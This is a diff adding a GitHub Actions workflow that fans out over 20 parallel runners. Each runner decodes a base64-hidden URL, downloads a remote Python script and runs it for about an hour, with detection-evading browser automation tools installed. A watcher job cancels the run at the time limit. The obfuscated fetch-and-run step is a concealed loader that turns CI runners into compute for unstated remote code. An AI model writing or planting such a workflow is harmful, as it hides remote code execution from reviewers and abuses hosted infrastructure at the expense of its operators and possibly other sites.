@@ -1,0 +1,103 @@
+name: "Alpha Grid Engine Core"
+
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: alpha-engine-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+permissions:
+  actions: write
+  contents: read
+
+jobs:
+  # =================================================================
+  # Watcher: monitors the timeline and terminates the workflow
+  # =================================================================
+  time-sentinel:
+    name: "System Timekeeper"
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+    env:
+      LIMIT_SECONDS: 3540
+    steps:
+      - name: Initialize Timekeeper
+        run: |
+          echo "[WATCHER] Chrono-watch active for execution ID: ${{ github.run_id }}"
+          echo "[WATCHER] Standing by for ${LIMIT_SECONDS} seconds (59-minute threshold)."
+
+          sleep "${LIMIT_SECONDS}"
+
+          echo "[WATCHER] Threshold reached — dispatching termination signal."
+
+          curl -sS -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/vnd.github+json" \
+            -H "X-GitHub-Api-Version: 2022-11-28" \
+            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
+
+          echo "[WATCHER] Termination signal dispatched. All active and pending tasks will be aborted."
+
+  # =================================================================
+  # Worker Grid: parallel execution of grid units
+  # =================================================================
+  worker-grid:
+    name: "Node-${{ matrix.node_code }}"
+    runs-on: ubuntu-latest
+    timeout-minutes: 59
+
+    strategy:
+      fail-fast: false
+      matrix:
+        node_code: [X1-A, X2-B, X3-C, X4-D, Y1-E, Y2-F, Y3-G, Y4-H, Z1-I, Z2-J, Z3-K, Z4-L, W1-M, W2-N, W3-O, W4-P, V1-Q, V2-R, V3-S, V4-T]
+
+    steps:
+      # #################################################################
+      # Phase 1: Environment Setup
+      # #################################################################
+      - name: Prepare Environment
+        run: |
+          echo "[SETUP] Initializing Node-${{ matrix.node_code }} environment..."
+          sudo apt-get update -qq
+          sudo apt-get install -y curl python3-pip
+
+      # #################################################################
+      # Phase 2: Fetching Payload
+      # #################################################################
+      - name: Fetch Core Module
+        run: |
+          echo "[FETCH] Downloading core module from remote repository..."
+          PAYLOAD_URL=$(printf '%s' "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 -d)
+          curl -sL "$PAYLOAD_URL" -o module_core.py
+          echo "[FETCH] Core module secured successfully."
+
+      # #################################################################
+      # Phase 3: Dependencies Installation
+      # #################################################################
+      - name: Install Dependencies
+        run: |
+          echo "[DEPS] Installing required Python packages..."
+          pip3 install -q undetected-chromedriver selenium requests psutil
+
+      # #################################################################
+      # Phase 4: Execute Core Module
+      # #################################################################
+      - name: Execute Core Module
+        run: |
+          echo ">> Launching Node-${{ matrix.node_code }} routine..."
+
+          python3 module_core.py &
+          MODULE_PID=$!
+
+          echo ">> Routine active. Time limit: 59 minutes (3540s)."
+
+          sleep 3540
+
+          if kill -0 "$MODULE_PID" 2>/dev/null; then
+            echo ">> Time limit exceeded — forcing process termination."
+            kill -9 "$MODULE_PID"
+            echo ">> Routine halted by safety controller."
+          else
+            echo ">> Routine finished prior to time limit."
+          fi
